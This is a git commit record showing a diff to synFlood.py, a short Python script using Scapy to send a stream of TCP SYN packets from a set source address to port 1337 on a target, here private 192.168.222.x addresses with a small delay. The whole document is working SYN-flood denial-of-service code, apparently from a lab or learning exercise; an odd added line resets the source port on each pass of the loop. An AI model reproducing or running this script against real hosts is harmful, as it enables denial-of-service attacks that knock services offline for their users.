e736f5a079fa9175ab48e9d8dc0d13823eb46234
almogelias <57565283+almogelias@users.noreply.github.com>
2020-01-09 17:50:13 +0200

    Update synFlood.py

--- .github/workflows/synFlood.py
+++ .github/workflows/synFlood.py
@@ -1,15 +1,22 @@
-
 from scapy.all import *
 from scapy.layers.inet import TCP, IP
+import time
+
 
 def synFlood(src, tgt):
+
     for sport in range(1024, 65535):
+        sport = 1024
         L3 = IP(src=src, dst=tgt)
+
         L4 = TCP(sport=sport, dport=1337)
+
         pkt = L3 / L4
+
         send(pkt)
+        time.sleep(0.01)
 
+src = "192.168.222.1"
+tgt = "192.168.222.2"
 
-src = "localhost"
-tgt = "localhost"
 synFlood(src, tgt)
